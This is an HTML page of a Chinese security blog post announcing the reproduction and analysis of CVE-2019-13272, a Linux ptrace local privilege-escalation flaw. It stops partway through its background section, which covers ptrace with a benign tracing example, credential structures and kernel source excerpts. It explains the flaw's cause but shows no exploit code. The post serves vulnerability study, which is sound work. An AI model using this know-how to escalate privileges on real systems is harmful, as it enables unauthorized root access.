

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/avatar.png">
  <link rel="icon" href="/img/avatar.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="arttnba3">
  <meta name="keywords" content="">
  
    <meta name="description" content="你不许说他，他是你爹？">
<meta property="og:type" content="article">
<meta property="og:title" content="【CVE.0x05】CVE-2019-13272 ptrace 漏洞复现及简要分析">
<meta property="og:url" content="http://blog.arttnba3.cn/2022/01/17/CVE-0X05-CVE-2019-13272/index.html">
<meta property="og:site_name" content="arttnba3&#39;s blog">
<meta property="og:description" content="你不许说他，他是你爹？">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://s2.loli.net/2022/01/17/3qApY5wSmMgvP8L.png">
<meta property="article:published_time" content="2022-01-16T17:49:56.000Z">
<meta property="article:modified_time" content="2022-01-16T17:54:33.000Z">
<meta property="article:author" content="arttnba3">
<meta property="article:tag" content="Pwn">
<meta property="article:tag" content="CVE">
<meta property="article:tag" content="Linux">
<meta property="article:tag" content="提权">
<meta property="article:tag" content="Linux Kernel">
<meta property="article:tag" content="ptrace">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://s2.loli.net/2022/01/17/3qApY5wSmMgvP8L.png">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>【CVE.0x05】CVE-2019-13272 ptrace 漏洞复现及简要分析 - arttnba3&#39;s blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"blog.arttnba3.cn","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="arttnba3's blog" type="application/atom+xml">
</head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 80vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>arttnba3&#39;s blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                友链
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/atom.xml">
                <i class="iconfont icon-rss"></i>
                rss
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('https://s2.loli.net/2022/01/17/vdRjaoW56Y34xLs.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="【CVE.0x05】CVE-2019-13272 ptrace 漏洞复现及简要分析"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2022-01-17 01:49" pubdate>
          2022年1月17日 凌晨
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          undefined 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          NaN 分钟
        
      </span>
    

    
    
      
        <span id="busuanzi_container_page_pv" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="busuanzi_value_page_pv"></span> 次
        </span>
        
      
    
  </div>


        
      </div>

      
        <div class="scroll-down-bar">
          <i class="iconfont icon-arrowdown"></i>
        </div>
      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">【CVE.0x05】CVE-2019-13272 ptrace 漏洞复现及简要分析</h1>
            
              <p class="note note-info">
                
                  
                    本文最后更新于：2022年1月17日 凌晨
                  
                
              </p>
            
            
              <div class="markdown-body">
                
                <p>你不许说他，他是你爹？</p>
<span id="more"></span>

<h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p>CVE-2019-13272 是自 Linux v4.11 版本起引入的一个本地提权漏洞，由来自 Google Zero Project 安全团队的  Jann Horn （<del>很帅气的外国小哥</del>）于 2019 年 9 月发现，该漏洞的成因主要是 ptrace 系统调用中 <code>PTRACE_TRACEME</code> 参数调用路径上的 <code>ptrace_link()</code> 函数错误地处理了想要创建 ptrace 关系的进程间的凭据记录，从而导致攻击者可以通过 suid 程序实现本地提权</p>
<p>该漏洞影响版本从 <code>v4.11</code> 到 <code>v5.1.17</code>，不过<strong>只能在有着桌面环境的情况下完成提权</strong>，因为提权需要用到一个通常只在桌面环境下存在的 <em>helper程序</em> ，所以相对比较鸡肋</p>
<p>在分析该漏洞之前，我们先补充一些前置知识</p>
<blockquote>
<p>以下内核源码皆来自于 Linux v4.11</p>
</blockquote>
<h2 id="ptrace-系统调用"><a href="#ptrace-系统调用" class="headerlink" title="ptrace 系统调用"></a>ptrace 系统调用</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="title function_">ptrace</span><span class="params">(<span class="keyword">enum</span> __ptrace_request request, <span class="type">pid_t</span> pid,</span></span><br><span class="line"><span class="params">                   <span class="type">void</span> *addr, <span class="type">void</span> *data)</span>;</span><br></pre></td></tr></table></figure>

<p>ptrace 系统调用主要用于对进程进行调试：该系统调用提供了一种机制使得调试进程（ptracer）可以观察与控制被调试进程（ptracee）的执行过程，并修改被调试进程的寄存器及内存，从而操控被调试进程实现特定的行为</p>
<blockquote>
<p> 相信大家对这个系统调用应该都不陌生，gdb 调试便是利用了这个系统调用</p>
</blockquote>
<p>常见的建立 ptrace 连接有两种方法：</p>
<ul>
<li>子进程通过 <code>PTRACE_TRACEME</code> 请求父进程进行调试</li>
<li>父进程通过 <code>PTRACE_ATTACH</code> 主动对指定进程进行调试</li>
</ul>
<p>这个漏洞主要是出现在第一条路径中，因此我们下文主要针对第一条路径进行分析</p>
<p>一个典型的通过 ptrace 由父进程对子进程进行单步调试的例子如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> wait_val;</span><br><span class="line">    <span class="type">int</span> instructions = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> child_pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (!child_pid) <span class="comment">// child</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] Set the child as a ptracee.&quot;</span>);</span><br><span class="line">        ptrace(PTRACE_TRACEME, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>); <span class="comment">// let the parent ptrace it, won&#x27;t stop there but send a signal to parent</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] Done. Now waiting for the parent...&quot;</span>);</span><br><span class="line">        execl(<span class="string">&quot;./helloworld&quot;</span>, <span class="string">&quot;helloworld&quot;</span>, <span class="literal">NULL</span>); <span class="comment">// the programme to be debug</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="comment">// parent</span></span><br><span class="line">    &#123;</span><br><span class="line">        wait(&amp;wait_val); <span class="comment">// waiting for the signal from child</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] Parent received signal, running...&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span> (wait_val == <span class="number">1407</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            instructions++;</span><br><span class="line">            <span class="keyword">if</span> (ptrace(PTRACE_SINGLESTEP, child_pid, <span class="number">0</span>, <span class="number">0</span>) != <span class="number">0</span>)</span><br><span class="line">                perror(<span class="string">&quot;ptrace error!&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            wait(&amp;wait_val);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] Done for %d instructions.\n&quot;</span>, instructions);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] Parent quit.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果如下：</p>
<p><img src="https://s2.loli.net/2022/01/13/ZodQuBfgsrLCXlp.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>通常情况下，ptrace <strong>只能调试属于 ptracer 所属用户的进程</strong>，例如普通用户便不能调试 root 进程</p>
<h2 id="task-struct：进程描述符（process-descriptor）"><a href="#task-struct：进程描述符（process-descriptor）" class="headerlink" title="task_struct：进程描述符（process descriptor）"></a>task_struct：进程描述符（process descriptor）</h2><p>在 Linux 中一个进程便是一个 task，在 kernel 中使用一个 <code>task_struct</code> 结构体进行标识，该结构体定义于内核源码<code>include/linux/sched.h</code>中</p>
<p>我们主要关心其对于进程权限的管理，注意到<code>task_struct</code>的源码中有如下代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Process credentials: */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Tracer&#x27;s credentials at attach: */</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>		*<span class="title">ptracer_cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Objective and real subjective task credentials (COW): */</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>		*<span class="title">real_cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>		*<span class="title">cred</span>;</span></span><br></pre></td></tr></table></figure>

<p><strong>Process credentials</strong> 是 kernel 用以判断一个进程权限的凭证，在 kernel 中使用 <code>cred</code> 结构体进行标识，对于一个进程而言应当有三个 cred：</p>
<ul>
<li><strong>ptracer_cred：</strong>使用<code>ptrace</code>系统调用跟踪该进程的调试进程（ptracer）的 cred</li>
<li><strong>real_cred：</strong>即<strong>客体凭证</strong>（<strong>objective cred</strong>），通常是一个进程最初启动时所具有的权限</li>
<li><strong>cred：</strong>即<strong>主体凭证</strong>（<strong>subjective cred</strong>），该进程的有效cred，kernel以此作为进程权限的凭证</li>
</ul>
<h2 id="cred：进程权限凭证（credentials）"><a href="#cred：进程权限凭证（credentials）" class="headerlink" title="cred：进程权限凭证（credentials）"></a>cred：进程权限凭证（credentials）</h2><p>对于一个进程，在内核当中使用一个结构体<code>cred</code>管理其权限，该结构体定义于内核源码<code>include/linux/cred.h</code>中，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">	<span class="type">atomic_t</span>	usage;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	<span class="type">atomic_t</span>	subscribers;	<span class="comment">/* number of processes subscribed */</span></span><br><span class="line">	<span class="type">void</span>		*put_addr;</span><br><span class="line">	<span class="type">unsigned</span>	magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC	0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD	0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="type">kuid_t</span>		uid;		<span class="comment">/* real UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		gid;		<span class="comment">/* real GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		suid;		<span class="comment">/* saved UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		sgid;		<span class="comment">/* saved GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		euid;		<span class="comment">/* effective UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		egid;		<span class="comment">/* effective GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		fsuid;		<span class="comment">/* UID for VFS ops */</span></span><br><span class="line">	<span class="type">kgid_t</span>		fsgid;		<span class="comment">/* GID for VFS ops */</span></span><br><span class="line">	<span class="type">unsigned</span>	securebits;	<span class="comment">/* SUID-less security management */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_permitted;	<span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_effective;	<span class="comment">/* caps we can actually use */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_bset;	<span class="comment">/* capability bounding set */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_ambient;	<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span>	jit_keyring;	<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">					 * keys to */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="type">void</span>		*security;	<span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>	<span class="comment">/* real user ID subscription */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>	<span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">	<span class="comment">/* RCU deletion */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="type">int</span> non_rcu;			<span class="comment">/* Can we skip RCU deletion? */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>	<span class="title">rcu</span>;</span>		<span class="comment">/* RCU deletion hook */</span></span><br><span class="line">	&#125;;</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>

<p>我们主要关注<code>cred</code>结构体中管理权限的变量</p>
<h3 id="用户ID-amp-组ID"><a href="#用户ID-amp-组ID" class="headerlink" title="用户ID &amp; 组ID"></a>用户ID &amp; 组ID</h3><p>一个cred结构体中记载了<strong>一个进程四种不同的用户ID</strong>：</p>
<ul>
<li><strong>真实用户ID</strong>（real UID）：标识一个进程<strong>启动时的用户ID</strong></li>
<li><strong>保存用户ID</strong>（saved UID）：标识一个进程<strong>最初的有效用户ID</strong></li>
<li><strong>有效用户ID</strong>（effective UID）：标识一个进程<strong>正在运行时所属的用户ID</strong>，一个进程在运行途中是可以改变自己所属用户的，因而权限机制也是通过有效用户ID进行认证的，内核通过 euid 来进行特权判断；为了防止用户一直使用高权限，当任务完成之后，euid 会与 suid 进行交换，恢复进程的有效权限</li>
<li><strong>文件系统用户ID</strong>（UID for VFS ops）：标识一个进程<strong>创建文件时进行标识的用户ID</strong></li>
</ul>
<p>在通常情况下这几个ID应当都是相同的</p>
<p>用户组ID同样分为四个：<code>真实组ID</code>、<code>保存组ID</code>、<code>有效组ID</code>、<code>文件系统组ID</code>，与用户ID是类似的，这里便不再赘叙</p>
<h3 id="命名空间（namespace）"><a href="#命名空间（namespace）" class="headerlink" title="命名空间（namespace）"></a>命名空间（namespace）</h3><p>cred 结构体中的 user_ns  字段标识了该进程所属的命名空间</p>
<h2 id="namespace：命名空间"><a href="#namespace：命名空间" class="headerlink" title="namespace：命名空间"></a>namespace：命名空间</h2><p><strong>命名空间</strong>（<strong>namespace</strong>） <strong>是 Linux kernel 用来隔离内核资源的方式。</strong> 通过 namespace 可以让一些进程只能看到与自己相关的一部分资源，而另外一些进程也只能看到与它们自己相关的资源，双方都无法访问对方命名空间中的资源</p>
<p>在 cred 当中有指向其所属命名空间的指针，在Linux kernel 中命名空间为一个 <code>user_namespace</code> 结构体，该结构体定义于 <code>/include/linux/user_namespace.h</code> 中，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">uid_gid_map</span>	<span class="title">uid_map</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">uid_gid_map</span>	<span class="title">gid_map</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">uid_gid_map</span>	<span class="title">projid_map</span>;</span></span><br><span class="line">	<span class="type">atomic_t</span>		count;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span>	*<span class="title">parent</span>;</span></span><br><span class="line">	<span class="type">int</span>			level;</span><br><span class="line">	<span class="type">kuid_t</span>			owner;</span><br><span class="line">	<span class="type">kgid_t</span>			group;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ns_common</span>	<span class="title">ns</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		flags;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Register of per-UID persistent keyrings for this namespace */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_PERSISTENT_KEYRINGS</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>		*<span class="title">persistent_keyring_register</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span>	<span class="title">persistent_keyring_register_sem</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span>	<span class="title">work</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SYSCTL</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ctl_table_set</span>	<span class="title">set</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ctl_table_header</span> *<span class="title">sysctls</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ucounts</span>		*<span class="title">ucounts</span>;</span></span><br><span class="line">	<span class="type">int</span> ucount_max[UCOUNT_COUNTS];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>我们主要关注这几个字段：</p>
<ul>
<li><strong>owner</strong>：即该命名空间的<strong>所有者</strong>；通常来说每个进程有其独立的命名空间，但对于一些需要共享资源的进程而言他们有可能会需要共享同一个命名空间</li>
<li><strong>group</strong>：命名空间所属的用户组</li>
<li><strong>parent</strong>：该命名空间的父命名空间，关系类似于父子进程，最上一层为 init_cred 的命名空间 <code>init_user_ns</code></li>
</ul>
<h2 id="linux-binprm：待执行文件数据"><a href="#linux-binprm：待执行文件数据" class="headerlink" title="linux_binprm：待执行文件数据"></a>linux_binprm：待执行文件数据</h2><p>前面讲到 ptrace 应当配合着 execve 进行使用，在 execve 系统调用中涉及到一个结构体叫做 <code>linux_binprm</code>，该结构体用以记录 kernel 加载（其实就是执行）一个二进制文件时用到的数据，定义于 <code>/include/linux/binfmts.h</code> 中，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This structure is used to hold the arguments that are used when loading binaries.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">linux_binprm</span> &#123;</span></span><br><span class="line">	<span class="type">char</span> buf[BINPRM_BUF_SIZE];</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MMU</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> vma_pages;</span><br><span class="line"><span 